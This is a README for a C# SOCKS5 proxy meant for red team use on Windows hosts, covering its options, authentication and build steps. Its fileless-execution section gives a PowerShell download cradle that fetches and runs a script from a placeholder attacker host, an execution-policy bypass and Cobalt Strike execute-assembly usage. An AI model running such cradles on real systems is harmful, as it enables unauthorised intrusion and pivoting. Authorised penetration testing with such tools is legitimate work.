# cs-socksd

Lightweight SOCKS5 proxy server written in C# for red team engagements.
Port of [socksd](https://github.com/totekuh/socksd).

Single-file, zero dependencies, targets .NET Framework 4.x.
Runs on any modern Windows machine (Win7+ / Server 2012+) out of the box — no install required.

## Features

| | |
|---|---|
| **Protocol** | SOCKS5 CONNECT (IPv4, IPv6, domain names) |
| **Auth** | Optional username/password, auth-once IP whitelisting |
| **Concurrency** | Async I/O via `TcpListener` / `TcpClient` |
| **Timeout** | 15-minute idle disconnect on relayed connections |
| **Execution** | Native `.exe`, reflective PowerShell loader, `execute-assembly` |
| **Runtime** | .NET Framework 4.x (pre-installed on every modern Windows box) |

## Quick Start

Download `socksd.exe` and `socksd.ps1` from the [Releases](https://github.com/totekuh/cs-socksd/releases) page.

```
socksd.exe -p 1080
socksd.exe -i 10.10.10.100 -p 4200 -u admin -P secret
socksd.exe -q -b -p 1080
```

### Fileless Execution

```powershell
# Reflective loader from disk
powershell -ep bypass -f socksd.ps1 -p 1080

# Download cradle
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/socksd.ps1'); Invoke-SocksD -p 1080

# Execute-assembly (Cobalt Strike, etc.)
execute-assembly socksd.exe -p 1080
```

## Options

```
-i, --ip <addr>      Listen address (default: 0.0.0.0)
-p, --port <port>    Listen port (default: 1080)
-u, --user <user>    Username for SOCKS5 auth
-P, --pass <pass>    Password for SOCKS5 auth
-1, --auth-once      Whitelist IP after first successful auth
-b, --bind           Bind outgoing connections to listen IP
-q, --quiet          Suppress all output
-h, --help           Show help message
```

The `-1` (auth-once) flag is useful for clients like Firefox that don't support SOCKS5 authentication — authenticate once with a tool like `curl`, then the source IP is whitelisted for subsequent unauthenticated connections.

## Building from Source

Cross-compiled on Linux via Mono:

```bash
sudo apt install mono-devel
```

```bash
make          # compile socksd.exe
make loader   # generate socksd.ps1 reflective loader
make all      # both
make clean    # remove build artifacts
```
